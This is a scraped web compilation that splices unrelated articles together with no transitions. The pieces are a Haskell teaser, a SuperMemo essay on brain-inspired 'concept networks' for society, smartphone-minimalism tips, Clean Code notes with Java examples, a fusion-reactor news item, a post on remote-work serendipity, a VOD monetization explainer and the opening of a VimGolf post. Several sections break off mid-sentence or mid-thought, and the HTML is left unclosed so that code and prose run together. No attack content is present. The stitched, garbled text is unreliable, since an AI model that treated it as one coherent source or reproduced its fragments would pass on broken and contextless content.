For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This article by Dr <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> is part of <a href="https://supermemo.guru/wiki/SuperMemo_Guru" title="SuperMemo Guru">SuperMemo Guru</a> series on memory, learning, creativity, and problem solving.</small>
</p>


<h2><span id="Perfect_brain">Perfect brain</span></h2>
<p>The brain is a perfect design for an intelligent machine. That design can be extended to form a perfect society and to accelerate the progress towards super-intelligence, singularity, and perhaps even <a href="https://supermemo.guru/wiki/Intrinsically_valuable_state" title="Intrinsically valuable state">intrinsically valuable state</a>. Even though I believe that my vision of the future is optimistic and good, there is no need to bicker about its value. It seems it is just an inevitable course of things emerging as the law of intelligence. 
</p><p>My utopian words can probably be given a precise mathematical framework backed up by a proof. In the end, it might be true that the entire science of physics centers around the competitive forces of intelligence and entropy.
</p>
<h2><span id="Concept_network">Concept network</span></h2>
<p>A concept network is an improvement over the basic idea of artificial neural networks. It has the properties that are often overlooked by neural network researchers:
</p>
<ul><li> the network can grow dendrites in search of new patterns</li>
<li> the network can grow axons while seeking better dissemination of valuable information</li>
<li> the network can grow new neurons along learning demands around often used concepts</li>
<li> the network can delete neurons that are in disuse</li>
<li> network memories exhibit properties known from the <a href="https://supermemo.guru/wiki/Two_component_model_of_memory" title="Two component model of memory">two component model of memory</a></li>
<li> network memories are subject to the <a href="https://supermemo.guru/wiki/Spacing_effect" title="Spacing effect">spacing effect</a> that determines <a href="https://supermemo.guru/wiki/Stabilization" title="Stabilization">stabilization</a> (see: <a href="https://supermemo.guru/wiki/Mechanism_of_the_spacing_effect" title="Mechanism of the spacing effect">Mechanism of the spacing effect</a>)</li>
<li> network self-organizes in the process of <a href="https://supermemo.guru/wiki/Conceptualization" title="Conceptualization">conceptualization</a>, i.e. architectural changes that lead to the development of an effective network of <a href="https://supermemo.guru/wiki/Concept" title="Concept">concepts</a></li></ul>
<p>Behavior of a network of concepts cannot realistically be predicted by the behavior of individual concepts. Individual concepts usually do not have access to information about the performance of the entire network.
</p>
<h2><span id="Society">Society</span></h2>
<p>In a society structured around the idea of a <a href="https://supermemo.guru/wiki/Concept_network" title="Concept network">concept network</a>, a new layer of conceptual organization can be formed in which humans, computers, intelligent agents, databases, executive agents, organizations, corporations, etc. can form an equivalent of advanced concepts. Such a network would provide a seamless co-existence of <a href="https://supermemo.guru/wiki/Artificial_intelligence" title="Artificial intelligence">artificial intelligence</a> and human <a href="https://supermemo.guru/wiki/Intelligence" title="Intelligence">intelligence</a> in a structure exhibiting super-intelligence that would quickly progress towards singularity. Mankind has already formed a de facto super-intelligent network. Its problem solving capacity will keep growing exponentially.
</p><p>Currently, societies are organized in ways that lead to a wasteful competition for resources and a conflict of interest. Instead, we could take inspiration from the brain and satisfy core ideas of main political philosophies. If we took all human resources and put them into a form of circulation system, we could drew upon those resources in proportion to the needs, and we might satisfy an old communist maxim: "to everyone according to his needs". A Nobel Prize winner could feed on the resources in proportion to inspiration generated by his brain for humanity. An anarchist or a libertarian would be happy with individual freedoms of individual neurons and concepts. Nobody tells an individual neuron what to do. Neuronal autonomy is perfect. A capitalist who loves market economy would love the efficiency of the neural market of ideas. A socialist would like the fact that even the weakest neurons could find their optimum roles and the access to the bloodstream of resources. There is even some room for religions. Super-intelligence would inevitably drive towards the concept of <a href="https://supermemo.guru/wiki/Intrinsically_valuable_state" title="Intrinsically valuable state">intrinsically valuable state</a>. Some of the religious dogma would probably need a degree of adaptation to the new reality, but I see intelligence as a source of existential answers that would fill the inevitable void.
</p>
<h2><span id="Technology">Technology</span></h2>
<p>There is no need for a revolution or a major re-design. As much as <a href="https://supermemo.guru/wiki/Tim_Berners-Lee" title="Tim Berners-Lee">Tim Berners-Lee</a> simple protocols could start the web, we might develop protocols for societal concept network. One of the first steps would be to provide protocols for redistribution of resources. Strong concepts in the network should never need to waste time on a struggle for resources. I advocate for <a href="https://supermemo.guru/wiki/Basic_income" title="Basic income">basic income</a>, which is a stopgap measure. However, blockchain micropayments are the future. An inventor cannot waste time seeking patents, angel investors, business partners, or sponsors. Too much young talent is wasted on a job search, in which a great brain lands in a secondary tier of somebody's else's sub-par effort. A good brain should be able to thrive in a concept network from the get-go without wasting a blink on existential issues.
</p>
<h2><span id="All_has_been">All has been</span></h2>
<p>The above text is just a compilation of old ideas of greater minds such as Ted Nelson, <a href="https://supermemo.guru/wiki/Tim_Berners-Lee" title="Tim Berners-Lee">Tim Berners-Lee</a>, Jeff Hawkins and many others. There are dozens of minor efforts and models that all slowly drive in that direction (did you hear of <a href="https://en.wikipedia.org/wiki/Complex_adaptive_system">CASs</a>?, or <a href="https://en.wikipedia.org/wiki/Decentralized_autonomous_organization">DAOs</a>? or <a href="https://en.wikipedia.org/wiki/Teal_organisation">Teal organizations</a>?). Most of all, a <a href="https://supermemo.guru/wiki/Concept_network" title="Concept network">concept network</a> is a self-organizing intelligent structure. So is humanity. Things are in progress already. However, it helps to see the progression using a convenient model. The brain seems like a good metaphor.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <p>👉 <em>Looking for actionables and screenshots? Scroll to the bottom of this post.</em></p>

<p>I opened my smartphone’s “screen time” app for the first time recently and was somewhat troubled to discover that on a particular day a few weeks ago:</p>
<ul>
  <li>I unlocked my phone 64 times;</li>
  <li>I used my phone for over 3 hours;</li>
  <li>I received 145 different notifications (!).</li>
</ul>

<p>My first thoughts upon seeing these numbers: how much of this time could I consider as “time well spent”? How much of it could I redirect towards healthier activities?</p>

<hr>

<p>Let’s open up an imaginary toolbox for a moment. Imagine a screwdriver.</p>

<p>A screwdriver is a tool in its purest form. It does not ask for anything, does not require maintenance, and doesn’t distract from the task at hand. It just sits there, patiently waiting to be picked up when needed.</p>

<p><strong>A tool does its job, then gets out of the way</strong>.</p>

<p>This is the kind of relationship I want with my smartphone. It should be tool, and nothing else. With that in mind, I set out to turn my smartphone into a tool again. This <a href="https://maximevaillancourt.com/blog/tech-is-not-an-end-part-1">“tool, not distraction” mentality is useful for all kinds of modern technology</a>, not just smartphones. Cal Newport’s “Digital Minimalism” covers this idea pretty well too (<a href="https://maximevaillancourt.com/bookshelf/digital-minimalism-cal-newport">view my reading notes</a>).</p>

<hr>

<p>Picking up my smartphone happens in one of two mental modes: mindfully, or mindlessly. There are no other possible modes of operation when picking up a smartphone.</p>

<p>Mindful use is the best case scenario. Ideally, every single time I’d pick up my smartphone, it would be to resolve a problem, and I’d put it down the second I’d be done. That’s entirely reasonable, though it’s not always what happens. What’s more, it’s not very realistic.</p>

<p>Let’s focus on improving the “mindless” part: I noticed that when I mindlessly pick up my phone, it’s either because a notification came in, or because I’m bored. Knowing this, I now have a few points of leverage I can use:</p>
<ul>
  <li><strong>I can reduce the number of incoming notifications</strong> (reducing the total number of potential unlocks I attempt on the device);</li>
  <li><strong>I can make it more difficult to mindlessly unlock the device</strong> (leading me to really consider if I want to use it);</li>
  <li><strong>I can make sure I spend quality time on the device</strong> once it’s unlocked (encouraging me to do something better than falling prey to distracting apps).</li>
</ul>

<p>To reduce incoming notifications:</p>

<ul>
  <li><strong>Disable notifications for most everything</strong>. I have notifications enabled for PagerDuty, phone calls, and video calls. Nothing else, not even instant messaging or email. If it’s important, I’ll go look for it myself.</li>
  <li><strong>Delete social media apps and mindfully using them on the laptop/desktop instead</strong>. I used to scroll through Twitter every day on my smartphone before. I now use it a few times a week on my laptop.</li>
</ul>

<p>To reduce the number of mindless unlocks:</p>

<ul>
  <li><strong>Hide notifications entirely from the lock screen</strong>. This is good from a privacy standpoint and a mindfulness standpoint, as it limits the information exposed to strangers while preventing your curiosity from taking over.</li>
  <li><strong>Disable biometric authentication</strong> such as face and/or fingerprint unlock and instead <strong>use a strong passphrase</strong>. It’s much less convenient, so it acts as a mindfulness check.</li>
</ul>

<p>To spend quality time on the device once it’s unlocked:</p>

<ul>
  <li><strong>Showcase useful apps on your home screen</strong>. For example, Duolingo, podcasts, Instapaper, Anki, Calendar, etc. You get the picture: not Facebook and Twitter.</li>
  <li><strong>Hide time-wasting apps</strong> from the home screen. Even better, delete them altogether! A first great step sis hiding them away in a folder of some sort.</li>
  <li><strong>Enable grayscale display mode</strong> to reduce the enticing effect of the apps icons’ bright colours.</li>
  <li><strong>Use an alternative launcher</strong> like <a href="https://jkuester.github.io/unlauncher/">Unlauncher</a>. You may even customize your launcher if you’re familiar with Java or Kotlin.</li>
</ul>

<p>All in all, the goal is to make it easier to use the device in a thoughtful, productive fashion than it is to use it for distracting purposes.</p>

<p>After these changes, screen time data for this week shows that on average I unlocked my device 11 times per day (~6x less than before), received 52 notifications per day (~3x less than before), and spent 70 minutes on the device per day (~3x less than before).  ✨</p>

<![CDATA[Clean Code – Notes]]>

<br/>
November 3, 2020 | https://smalldata.tech/blog/2018/09/16/clean-code-notes | <a href="https://web.archive.org/web/*/https://smalldata.tech/blog/2018/09/16/clean-code-notes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
  The following is a list of notes taken on writing clean code, i.e. code that is maintainable and extensible.
</p>
<h5 id="names">Names</h5>
<p>
  Naming is the <i>hardest</i> and the most important part of writing clean code. Names should clearly express intent
  and the assumption here is that everyone involved in the codebase has the same cultural background which is not
  always the case in practice. Some general tips:
  </p><ul>
    <li>Classes should be Nouns, e.g. <code>User</code></li>
    <li>Methods should be verbs, e.g. <code>getById()</code>, <code>save()</code></li>
    <li>No need for prefixes such as <code>m_</code> or <code>str</code> for strongly typed languages</li>
    <li>Pick one word per concept, e.g. <code>fetch</code>, <code>retrieve</code> and <code>get</code> are
      semantically equal</li>
  </ul>

<h5 id="functions">Functions</h5>
<p>
  Functions or methods are the fundamental building blocks of programming. In fact, the internal operation of
  programs normally consists mostly of functions pushing data onto and popping data off the stack as they call each
  other. Sometimes memory needs to be allocated on the heap for data that must survive across function calls.
</p>
<p>
  When a function is called, a <strong>stack frame</strong> is created to support the function's execution. The stack
  frame contains the function's local variables and the arguments passed to the function by its caller. The frame
  also contains housekeeping information that allows the called function (the callee) to return to the caller safely.
  The exact contents and layout of the stack vary by processor architecture and function call convention.
</p>
<div>
  <p><a href="https://smalldata.tech/img/blog/call-stack-layout.svg">
      <img alt="An example of a call stack for the DrawLine function which is called by DrawSquare" src="https://smalldata.tech/img/blog/call-stack-layout.svg">
    </a>
  </p>
  
  <p>
    An example of a call stack for the <code>DrawLine</code> function which is called by <code>DrawSquare</code>.
  </p>
</div>
<p>
  Some general tips on writing functions:
  </p><ul>
    <li>Functions should be small and they should do 1 thing only:
      <ul>
        <li>Only have 1 level of indentation - highly nested functions should be refactored into sub-routines</li>
        <li>
          <strong>No side-effects!</strong>
          <pre>public int sum(int a, int b) {
    int result = a + b;
    resetGui(); // this is untestable and introduces a hidden dependency!
    return result;
}
</pre>
        </li>
      </ul>
    </li>
    <li>Do not return <code>null</code> - caller will need to always check cluttering p code, consider using <i>special
        case</i> return values</li>
    <li>Don't pass <code>null</code> as a parameter value either</li>
    <li>Prefer exceptions for error conditions except in cases were a <code>Nullable</code> or <code>Optional</code>
      type is available</li>
    <li>Should ideally return a value, especially for monadic functions as this allows function chaining</li>
    <li>Fewer arguments are better - the more the arguments, the more the complexity and test cases that need to be
      written</li>
  </ul>

<h5 id="oop">Object Oriented Programming</h5>
<p>
  An important but suble point to note in OOP is that objects hide their data behind abstractions and expose
  functions that operate on that data whereas data structures expose their data and have no meaningful functions.
  Good OOP requires knowing when to use objects and when to use data structures. Consider the following example:
  </p><pre>public class Point {
    public double x;
    public double y;
}

public interface Point {
    double getX();
    double getY();
    void setCartesian(double x, double y);
    double getR();
    double getTheta();
    void setPolar(double r, double theta);
}

    <p>
      In the second <code>Point</code> definition the co-ordinate system being used by the implementation is not
      known and need not necessarily be cartesian nor polar!
    </p>
    <p>
      Tips on writing clean OO code:
      </p><ul>
        <li>Classes should be small and follow the Single Responsibility Principle (SRP)</li>
        <li>Classes should have high cohesion, i.e. operate on a small number of variables</li>
        <li>Avoid using boundary interfaces, e.g. instead of returning a <code>Map</code>, wrap it in a class (<code>Sensors</code>)
          to encapsulate the implementation</li>
        <li>Comments should only be used for clarification or amplification - avoid in general and let the code
          do the talking!</li>
        <li>Prefer exceptions to error codes - error codes have the habit of spilling out into the entire
          system</li>
        <li>Use unchecked exceptions to not break encapsulation</li>
      </ul>
    
    <p>
      Finally, procedural code makes it hard to add new data structures because all the functions must change. OO
      code makes it hard to add new functions because all the classes must change. Again, writing clean code
      requires insight as to when to use which style of programming.
    </p>
    <h5 id="tdd">Test Driven Development</h5>
    <p>
      Unit Tests should follow the F.I.R.S.T principle, i.e. they should be Fast, Independent of any external
      dependencies or manual setup, Repeatable, Self-validating (no manual checking verification) and Timely (run
      just before writing production code). Some general tips on writing clean tests:
      </p><ul>
        <li>Tests should be readable above all else and this might mean relaxing certain production code
          restrictions on performance</li>
        <li>Single concept per test</li>
        <li>Create helper methods to simplify complicated setups</li>
        <li>Convert multiple asserts into a single assert via a state pattern</li>
      </ul>
    

    <p>
      The three laws of TDD:
      </p><dl>
        <dt>First law</dt>
        <dd>You may not write production code until you have written a failing test.</dd><dt>Second law</dt>
        <dd>You may not write more of a test than is sufficient to fail, and not compiling is failing.</dd>
        <dt>Third law</dt>
        <dd>You may not write more production code than is sufficient to pass the currently failing test.</dd>
      </dl>

        Not quite TDD.
      </p>
    </div>

    <h5 id="system-design">System Design</h5>
    <ul>
        <li>Classes should follow the open-closed principle - open for extension but closed for modification.
          Consider the following example where we write an <code>AreaCalculator</code> which calculates the
          total area of a collection of rectangles.
          <pre>public class Rectangle {
    public double width;
    public double height;
}

public class AreaCalculator {

    public double calculateArea(Collection<rectangle> rectangles) {
        double result = 0;
        for (Rectangle r : rectangles) {
            result += r.width * r.height;
        }
        return result;
    }
}
</rectangle></pre> We would now like to extend this function to calculate the area of circles as well. Our new function now looks
          as follows:
          <pre>public abstract class Shape { }

public class Rectangle extends Shape {
    public double width;
    public double height;
}

public class Circle extends Shape {
    public double radius;
}

public class AreaCalculator {

    public double calculateArea(Collection<shape> shapes) {
        double result = 0;
        for (Shape s : shapes) {
            if (s instanceof Rectangle) {
                Rectangle r = (Rectangle) s;
                result += r.width * r.height;
            } else {
                Circle c = (Circle) s;
                result += c.radius * c.radius * Math.PI;
            }
        }
        return result;
    }
}
</shape></pre> Extending this further to calculate the area of triangles now requires another modification to the <code>calculateArea</code>
          method, i.e. it is not <strong>open for extension</strong>. We can change this by introducing an
          <code>area</code> method on the <code>Shape</code> data structure. Our code now looks like the
          following:
          <pre>public abstract class Shape {
    abstract double area();
}

public class Rectangle extends Shape {
    public double width;
    public double height;

    @Override
    public double area() {
        return width * height;
    }
}

public class Circle extends Shape {
    public double radius;

    @Override
    public double area() {
        return radius * radius * Math.PI;
    }
}

public class AreaCalculator {

    public double calculateArea(Collection<shape> shapes) {
        double result = 0;
        for (Shape s : shapes) {
            result += s.area(); // note the simplicity
        }
        return result;
    }
}
</shape></pre>
        </li>
        <li>Dependency Inversion Principle - depend upon abstractions and interfaces, not concrete
          implementations</li>
        <li>When building large software systems, try to avoid doing a big design up front - use a dependency
          injection container to separate cross-cutting concers like transactions, logging, etc. from
          business logic</li>
      </ul>

        <div><p>Clean energy from fusion is a step closer with the launch of the MAST Upgrade tokamak.</p>
<div id="attachment_14062"><p><img aria-describedby="caption-attachment-14062" src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgOTYwIDY0MCIgd2lkdGg9Ijk2MCIgaGVpZ2h0PSI2NDAiIGRhdGEtdT0iaHR0cHMlM0ElMkYlMkZjY2ZlLnVrYWVhLnVrJTJGd3AtY29udGVudCUyRnVwbG9hZHMlMkYyMDIwJTJGMTAlMkZnb3YudWtfLmpwZyIgZGF0YS13PSI5NjAiIGRhdGEtaD0iNjQwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==" data-spai="1" alt="MAST Upgrade first plasma" width="400" height="267" sizes="(max-width: 400px) 100vw, 400px"></p><p id="caption-attachment-14062">MAST Upgrade first plasma</p></div>
<p>For the first time, after a seven-year build, UKAEA’s £55M-machine, labelled <a href="https://ccfe.ukaea.uk/research/mast-upgrade/">Mega Amp Spherical Tokamak (MAST) Upgrade</a>, has achieved “first plasma” – where all the essential components work together simultaneously.</p>
<p>The project at Culham Centre for Fusion Energy was funded by the Engineering &amp; Physical Sciences Research Council, part of UK Research &amp; Innovation and the Department for Business, Energy &amp; Industrial Strategy.</p>
<p>Fusion energy offers the potential of an abundant, inherently safe low-carbon electricity supply (the raw materials are found in seawater and the Earth’s crust). It involves fusing hydrogen particles in a hot gas known as a ‘plasma’ to unlock large amounts of energy.</p>
<p>Operating fusion technologies requires a careful balancing act of controlling extreme heat, gas and powerful magnetic fields, amongst other complex systems.</p>
<h3>Super-X factor</h3>
<p>One of the biggest challenges in fusion research has been to extract the amount of excess heat from the plasma. UKAEA’s scientists now plan to test a new exhaust system called the ‘Super-X divertor’ at MAST Upgrade.</p>
<p>This system is designed to channel plasma out of the machine at temperatures low enough for its materials to withstand – meaning that components can last much longer. The approximate tenfold reduction in heat arriving at the internal surfaces of the machine has the potential to be a game-changer for the long-term viability of future fusion power stations.</p>
<h3>A step towards fusion power</h3>
<p>MAST Upgrade will be the forerunner of the UK’s prototype fusion power plant, <a href="https://ccfe.ukaea.uk/research/step/">Spherical Tokamak for Energy Production (“STEP”)</a>, due for completion by 2040.</p>
<p>STEP – which UKAEA is designing in an initial £220 million programme funded by the UK Government – will be based on MAST Upgrade’s ‘spherical tokamak’ fusion concept. The spherical tokamak could offer a route to a compact fusion power plant. The success of MAST Upgrade is another step along the way to designing future fusion power facilities, which could have an important role as part of a future portfolio of low-carbon energy.</p>
<p>MAST Upgrade will also aid preparations for <a href="https://www.iter.org/" target="_blank" rel="noopener noreferrer">ITER</a> – the world’s largest science megaproject, now being built in the South of France, which intends to demonstrate fusion power on an industrial scale.</p>

<p>UK Science Minister, Amanda Solloway, said: “We want the UK to be a world leader in fusion energy and to capitalise on its amazing potential as a clean energy source that could last for hundreds of years.</p>
<p>“Backed by £55 million of government funding, powering up the MAST Upgrade device is a landmark moment for this national fusion experiment and takes us another step closer towards our goal of building the UK’s first fusion power plant by 2040.”</p>
<p>Commenting on the achievement of first plasma, UKAEA CEO, Professor Ian Chapman, said:</p>
<p>“MAST Upgrade will take us closer to delivering sustainable, clean fusion energy. This experiment will break new ground and test technology that has never been tried before. It ensures the UK is in the premier league of countries working on fusion – and will be vital in achieving UKAEA’s goal of building the STEP fusion power plant.”</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p><strong>serendipity</strong></p>
<p> noun <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the occurrence and development of events by chance in a happy or beneficial way.<br>&nbsp;&nbsp;&nbsp; <em>”a fortunate stroke of serendipity"</em></p></div>
<p>I hadn't even heard of the word ‘serendipity’ before COVID and true to its nature - serendipity is events happening organically - by chance or "spontaneously".</p>
<p>In real life, we almost always fail to notice serendipity to put a word on it. I only came across the word when everything went remote and random interactions came to a full stop and now suddenly, something was missing. <br>
Obviously, it was other people.
But even with video calls, meetings, standups - it didn't feel right. </p>
<p>The truth is nothing can beat a real-life conversation with someone - not chat, audio or video. Maybe not even VR or holograms.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/97962688-b401eb00-1ddb-11eb-9903-2c485567e6e6.gif" alt="Silicon Valley GIF"></p><p><em>(Silicon Valley, S1E5)</em></p>
<hr>

<p>Random interactions in a fully remote world have to be forced. That’s just how we must play it now. But trying to duplicate in-person serendipity in a remote world - as is - might not be a great way out.</p>
<p>For instance, take the Qt World Summit this year which happened about a week ago:</p>
<p><img src="https://user-images.githubusercontent.com/32199592/97961622-ab101a00-1dd9-11eb-88b4-ab044cf9da5e.png" alt="qtws"></p><p><em>Reminds me of Club Penguin. Heh</em></p>
<p>I don’t know about you but to me, that looks extraordinarily distracting and borderline unnecessary. </p>
<p>Creating organic serendipity in a totally remote set up is a tough nut to crack - props to Qt for trying something new but to pretend that ‘online’ is the new ‘offline’ might not be the way to solve it. </p>
<p>On the same note though, multiplayer games are quite effective in the right context - simple, popular ones like <a href="http://www.innersloth.com/gameAmongUs.php">'Among Us'</a> can work both as an icebreaker and as a way to create organic interactions between a group of people and games have always been a source of a spontaneous group activity.</p>
<hr>
<br>
<h3>Embracing remote</h3>
<p><strong>The case of GitLab</strong></p>
<p><a href="https://about.gitlab.com/">GitLab</a> is an all remote company - right from the beginning as an open-source project - GitLab, in its initial days, was developed from contributors around the world. The GitLab team is now over 1,200 employees strong and Gitlab recently held its Series E round with $268M raised - and all of this without even having a physical office.</p>
<p>GitLab has an <a href="https://about.gitlab.com/company/culture/all-remote/">excellent handbook</a> on remote work, some key points - </p>
<h4>Regular engagement</h4>
<p>To simulate serendipity within a team - engage regularly on a weekly basis - in form of text or video. </p>
<p>Nothing beats seeing someone in person and the closest we can get to in-person meetings are video calls. Try to have regular video calls with your team - it might require some getting used to - to discuss something other than work but once you establish a flow, video calls are super effective.</p>
<p>Even an always-on video conferencing room or dedicated time slots for video/audio chat can also work wonders.</p>
<br>
<h4>Async</h4>
<p>Regarding work - asynchronous is preferred over synchronous communication.</p>
<p>Meetings are synchronous events - they require everyone at the same time.
Asynchronous events are things like chat/etc that do not require an immediate response.</p>
<p>An all remote culture means employees from all different timezones and so - meetings are only kept for the most important things and are also most of the times, optional. </p>
<p>Record the meetings, have an agenda, maintain the minutes, allow people to asynchronously contribute and don’t waste time.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/97961918-27a2f880-1dda-11eb-9a8d-8871b55cb778.png" alt="this meeting should have been an email"></p><h4>Role of text communication</h4>
<p>Most of remote communication happens through text and texting can get quite difficult at times - mainly because of the lack of non-verbals (like the lack of your facial expressions and tone when you are trying to tell a joke in chat but no one gets it)</p>
<p>"<em>Text communication can be easily derailed, and assumptions can lead to  good-mannered communiques being viewed as a slight.</em>"</p>
<p>Assume the best - don’t be an asshole.
From experience, when things start getting heated up on a text chat, jump immediately to a video call and straighten things up. Don’t keep it for later. </p>
<p>It’s really, really easy to get angry with someone’s stupid texts but when you see their face or hear their voice, that anger starts to dissipate ;)</p>
<br>
<hr>
<p>All in all, remote is tough and we need to intentionally create situations and design systems where we can interact organically and spontaneously.</p></div></div>]]>

<p>When I asked people in the streaming industry, what Video On Demand or VOD meant to them, this is what I got (averaging across responses). </p>



<p><em>Video On Demand is a video delivery mechanism that allows users to watch a video whenever they want to and wherever they want to.</em></p>



<p>Of course, this statement comes with caveats. VOD access can be restricted based on age, geography, monetization strategy, device, and so many other means. </p>



<p>In this article, we take a look at some of the common ways by which content providers can monetize their VOD content library. We also take a look at the advantages and pitfalls of each of these methods. </p>



<hr>



<h2><span id="AVOD_%E2%80%93_AdvertisingBased_Video_On_Demand"></span>AVOD – Advertising-Based Video On Demand?<span></span></h2>



<p>AVOD or Advertising-Based Video On Demand is a monetization strategy in which advertisements are inserted into the video to monetize it and (in almost all cases), the content can be consumed for free without paying or subscribing to the service. </p>



<h3><span id="Where_does_AVOD_Work"></span>Where does AVOD Work?<span></span></h3>



<p>AVOD is a monetization technique that is predicated on a large number of people consuming the content in order to make it financially viable. The publisher typically gets paid a couple of dollars (or more) for every 1000 ad impressions and this means, that a lot of people need to watch the video for the publisher to make a resonable amount of money. </p>



<p>AVOD is typically suited for news websites, and UGC sites such as YouTube, Hulu,  where the primary source of income is from advertising driven by large audiences. AVOD a <a href="https://www.nexttv.com/news/streamers-flock-to-avod-gold-rush" target="_blank" rel="noopener">very popular form of video monetization</a> and ad insertion is not going to go away anytime soon! </p>



<h3><span id="How_Can_AVOD_Go_Wrong"></span>How Can AVOD Go Wrong?<span></span></h3>



<p>Well, that’s not hard to answer! Have you ever watched a video on YouTube with 40 ads inserted into it? Remember the frustration you felt waiting for the “Skip Ads” button to appear?</p>



<div><figure><img loading="lazy" src="https://i0.wp.com/memegenerator.net/img/images/12523690.jpg?resize=435%2C245&amp;is-pending-load=1#038;ssl=1" alt="Extremely Frustrated - Caption | Meme Generator" width="435" height="245" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/memegenerator.net/img/images/12523690.jpg?resize=435%2C245&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>SKIP ADS!!!</figcaption></figure></div>



<p>Well, “<strong>user frustration</strong>” is a huge problem with AVOD. </p>



<p>Too many ads can <strong>literally kill the golden goose (your audience)</strong>. But, too few ads and you won’t make any money to pay your bills at the end of the month. </p>



<p>So, it’s a balancing act between making money, not frustrating your users, and showing the correct number of relevant ads. What’s the correct number of ads? Well, you need a specialized analytics service to track and report on this. </p>



<hr>



<h2><span id="SVOD_%E2%80%93_Subscription_Video_On_Demand"></span>SVOD – Subscription Video On Demand<span></span></h2>



<p>SVOD is a type of VOD monetization where users are required to pay a certain amount of money or subscription fee upfront to get access to the content providers’ library. This is usually a recurring fee and is usually either monthly or yearly. </p>



<p>Typically, the users are not shown any ads because they have paid a certain fee already (<em>which means, the publisher has already made money off of the user</em>). </p>



<p>SVOD is a very common monetization strategy that is quite beneficial to the end-user when the plan doesn’t have any lock-in periods. People may choose to purchase a monthly plan and cancel the following month. </p>



<p>As you can see, this sort of flexibility is a double-edged sword. It </p>



<p>Netflix, Hotstar, Hulu, HBO, Amazon Prime Video are all examples of SVOD. </p>



<h3><span id="How_can_SVOD_go_Wrong"></span>How can SVOD go Wrong?<span></span></h3>



<p>SVOD can go wrong in many ways and the primary way is by setting a very high subscription fee, but, not having a large enough or relevant content library to back it up. If you charge your users $15 a month when your nearest competitor is charging $7/month, then you need to justify the $8 gap. </p>



<p>Do you have better movies? Latest releases? A bigger library? More genres? Better quality of experience? </p>



<hr>



<h2><span id="TVOD_%E2%80%93_TransactionBased_Video_On_Demand"></span>TVOD – Transaction-Based Video On Demand<span></span></h2>



<p><strong>TVOD</strong> or <strong>Transactional Video On Demand</strong> basically refers to a rental based monetization where the user rents or has access to the service for a short period of time by paying a fee. </p>



<p><strong>This is also referred to as “pay per view”. </strong></p>



<p>A simple example is that of MMA (Mixed Martial Arts) or Boxing matches. You can pay to see a fight online and then your access to the service is complete. If you want to access or use any other content, you’ll have to pay another fee. </p>



<p>Apart from one-off events, TVOD also refers to rental services offered by content providers such as YouTube and Amazon Prime Video. In either of these services, you can rent a movie for a couple of days and then your access to the content is stopped. </p>



<h3><span id="What_can_go_wrong_with_TVOD"></span>What can go wrong with TVOD?<span></span></h3>



<p>In TVOD, if one does not get the price right, then the number of live viewers will be less and people might prefer to watch it for free later on using catch-up services. The same goes for video rentals – people might choose to rent it from a different provider at a lower cost.</p>



<p>Also, since the customer is not “locked-in”, there needs to be sustained marketing and promotions to ensure that the customer makes repeat purchases. It is a tough monetization choice, but one that can provide handsome returns! </p>



<hr>



<h2><span id="PVOD_%E2%80%93_Premium_Video_On_Demand"></span>PVOD – Premium Video On Demand<span></span></h2>



<p>Premium Video on Demand is a form of TVOD or SVOD where the end-user can pay to get access to content sooner than other SVOD or TVOD customers would! Think of PVOD as a form of online-movie-theaters. You can go see the latest movie at the theaters or wait three or four months to see them on an SVOD service, right? </p>



<p>Well, that’s exactly the monetization model for PVOD. You can pay a “premium” price to watch a movie before it hits the general SVOD subscriber pool. </p>



<p>Disney’s Mulan is a good example of PVOD. You needed a subscription to Disney+ and then you had to pay an additional $25 (or so) to watch Mulan first-day-first-show! But, you retained access to the movie until it because available to the rest of the Disney+ subscribers. </p>



<p>With the COVID-19 pandemic forcing cinemas shut, I feel we are going to see more of PVOD in the coming months! </p>



<hr>



<h2><span id="Hybrid_Revenue/Monetization_Models"></span>Hybrid Revenue/Monetization Models<span></span></h2>



<p>Just to be clear, VOD monetization does not stop at AVOD, SVOD, TVOD, and PVOD. </p>



<p><strong>In fact, many popular services offer a combination of the above monetization models to appeal to different segments of users.</strong> </p>



<p>There are hybrid models such as the “<strong>Freemium Model</strong>” that merges AVOD and SVOD. In the freemium model, a user can consume content for free but will have to contend with the occasional advertisement interrupting his video session. </p>



<p>But, if that user chooses to upgrade to a paid subscription, the ads go away! </p>



<p>Another variation of the freemium model is providing a small section of your content library for free and charging a subscription fee to watch the more premium content.  </p>



<p>Freemium is a popular tactic that is used to attract users with free content, get them hooked, and hopefully convert them into paid customers. </p>



<hr>



<h2><span id="Conclusion"></span>Conclusion<span></span></h2>



<p>There you have it – different monetization models for VOD (AVOD, SVOD, TVOD, PVOD, and other Hybrid Models). All of these have their own advantages and disadvantages. The idea is to get your strategy, marketing, and focus right. And then, everything will fall into place.</p>



<p>So, what do you use to monetize your content library? </p>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>After a decade of honing my skills as a mini-golfer, I’ve recently progressed onto playing a new version of golf: <a href="https://www.vimgolf.com/">VimGolf</a>. I’ve been using <a href="https://www.vim.org/">Vim</a> for a few years now, and noticed that my Vim skillset had plateaued. The premise of VimGolf is simple: challenges consist of a start file and an end file. The goal is to get from the start file to the end file, using Vim, in as few keystrokes as possible. I’ve been playing VimGolf as a way to acquire new skills.</p>

